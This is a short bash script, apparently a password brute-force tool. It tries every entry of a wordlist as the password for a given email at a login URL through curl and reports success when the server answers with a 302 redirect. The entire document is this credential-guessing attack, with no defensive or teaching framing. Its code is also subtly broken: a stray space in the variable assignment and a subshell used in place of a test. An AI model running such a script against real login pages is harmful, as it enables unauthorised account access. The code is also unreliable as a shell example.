#!/bin/bash

url=$1
user=$2
word_list=$3

word_Lists=`cat $word_list`
for lines in $word_Lists
do
	http_code= $(curl -L --post302 -G -d email="$user" -d password="$lines" "$url" -w "%{http_code}" -s )
	if ( "$http_code" == "302" )
	then
		echo "[+] success : $lines "
		break
	else
		echo "[-] field : $lines "
	fi
done